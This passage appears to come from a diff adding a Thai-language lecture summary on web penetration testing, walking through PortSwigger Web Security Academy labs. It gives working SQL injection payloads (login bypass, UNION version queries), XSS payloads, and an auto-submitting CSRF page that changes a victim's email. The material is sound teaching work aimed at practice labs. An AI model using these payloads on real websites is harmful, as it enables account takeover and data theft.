+        <strong>นี่คือ Business Logic Flaw:</strong> ไม่ใช่ bug ทางเทคนิค แต่เป็น "ตรรกะธุรกิจที่เชื่อ client เกินไป" —
+        server รับราคาที่ client ส่งมาโดยไม่ตรวจสอบซ้ำ นี่คือเหตุผลที่ต้องเข้าใจ Burp Suite
+        เพราะเราเห็นและแก้ทุกค่าที่ส่งไปได้
+      </div>
+
+      <h2>9. PortSwigger Web Security Academy — Labs ทีละขั้น</h2>
+      <p>
+        ห้องเรียนออนไลน์ฟรีจาก PortSwigger (<code>https://portswigger.net/web-security</code>)
+        พร้อม lab จริงทุกช่องโหว่ — ใช้คู่กับ Burp Suite:
+      </p>
+
+      <h3>9.1 SQL Injection Labs</h3>
+      <table>
+        <tr>
+          <th>โจทย์</th>
+          <th>วิธีแก้ (ใช้ Burp intercept + แก้พารามิเตอร์)</th>
+        </tr>
+        <tr>
+          <td><strong>Retrieving hidden data</strong></td>
+          <td>แก้ <code>category</code> เป็น <code>'+OR+1=1--</code> → เห็นสินค้าที่ยังไม่ปล่อยขาย (unreleased)</td>
+        </tr>
+        <tr>
+          <td><strong>Login bypass</strong></td>
+          <td>แก้ <code>username</code> เป็น <code>administrator'--</code> → ล็อกอินเป็น admin โดยไม่รู้รหัสผ่าน (comment ตัดเช็ค password)</td>
+        </tr>
+        <tr>
+          <td><strong>Query DB version (Oracle)</strong></td>
+          <td>
+            ทดสอบจำนวนคอลัมน์ด้วย <code>'+UNION+SELECT+'abc','def'+FROM+dual--</code> แล้วดึง version ด้วย
+            <code>'+UNION+SELECT+BANNER,+NULL+FROM+v$version--</code>
+          </td>
+        </tr>
+        <tr>
+          <td><strong>Query DB version (MySQL/Microsoft)</strong></td>
+          <td>ทดสอบด้วย <code>'+UNION+SELECT+'abc','def'#</code> แล้วดึง version ด้วย <code>'+UNION+SELECT+@@version,+NULL#</code></td>
+        </tr>
+      </table>
+
+      <h3>9.2 XSS Labs</h3>
+      <ul>
+        <li><strong>Reflected XSS (nothing encoded):</strong> ยิงในช่องค้นหา → <code>&lt;script&gt;alert("My Script!")&lt;/script&gt;</code></li>
+        <li><strong>Stored XSS (nothing encoded):</strong> ส่ง comment ที่มี alert → script ทำงานเมื่อมีคนเปิดโพสต์</li>
+        <li><strong>DOM XSS (document.write sink + location.search):</strong> ใช้ payload <code>"&gt;&lt;svg onload=alert(1)&gt;</code></li>
+      </ul>
+
+      <h3>9.3 CSRF Lab — เปลี่ยนอีเมลเหยื่อ (no defenses)</h3>
+      <p>Login <code>wiener:peter</code> → ส่งฟอร์ม Update email → หา request ใน Proxy history → copy URL แล้วสร้างหน้า exploit:</p>
+      <p>
+        <code>&lt;form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"&gt;</code><br />
+        <code>&lt;input type="hidden" name="email" value="evil@hacker.net"&gt;</code><br />
+        <code>&lt;/form&gt;</code><br />
+        <code>&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</code>
+      </p>
+      <ol>
+        <li>ไปที่ exploit server → วาง HTML ด้านบนในส่วน Body → กด <strong>Store</strong></li>
+        <li>ทดสอบกับตัวเองก่อน: <strong>View exploit</strong> → ตรวจ request/response ที่ได้</li>
+        <li>เปลี่ยนอีเมลใน exploit ให้ไม่ใช่ของตัวเอง แล้วกด <strong>Deliver to victim</strong> → ผ่าน lab</li>
+      </ol>
+
+      <hr />
+
+      <h2>10. สรุปภาระงานที่ต้องส่ง (Exercises &amp; Evidence)</h2>
+      <ul>
+        <li>
+          <strong>Exercise — XSS Reflected:</strong> พิมพ์
+          <code>&lt;script&gt;alert("This is my XSS script running!")&lt;/script&gt;</code>
+          ลงใน textbox แล้วกด submit → แคปภาพตอน alert ทำงาน
+        </li>
+        <li>
+          <strong>Exercise — XSS Stored:</strong> กด sign guestbook → ใส่ script ลงใน message
+          (จะถูกเก็บลง database) → กลับไปหน้าแรก → เลือกเมนู XSS stored → เห็น alert ทำงานเอง
+          (ยืนยันว่า script ถูกเก็บจริงและทำงานกับทุกคน)
+        </li>
+        <li>
+          <strong>Exercise — CSRF:</strong> สร้างรหัสผ่านใหม่ "123" แล้วกด Change →
+          สังเกตใน URL ว่าขาด CSRF token → อธิบายว่าทำไม attacker จึงล่อให้เหยื่อคลิกได้
+        </li>
+        <li>
+          <strong>หลักฐาน:</strong> แคปเจอร์ภาพทุกข้อ (payload + ผลลัพธ์) พร้อมระบุระดับ security level ที่ใช้
+        </li>
+      </ul>
+      <div class="note">
+        <strong>สรุปแนวคิดเดียวของทั้งบท:</strong> Web Hacking = ทำให้ input ของเรา
+        ถูกตีความเป็น "โค้ด" แทน "ข้อมูล" ไม่ว่าจะเป็น SQL (SQLi), JavaScript (XSS), หรือ
+        การใช้ session แทนเจ้าของ (CSRF) — การป้องกันจึงเน้น validate/encode input
+        และบังคับใช้ token ที่เดาไม่ได้
+      </div>
+    </main>
+
+    <div class="footer">
+      สรุปเนื้อหา Lecture 8 &mdash; Penetration Testing and Protection &copy; 2026
+    </div>
+  </body>
+</html>
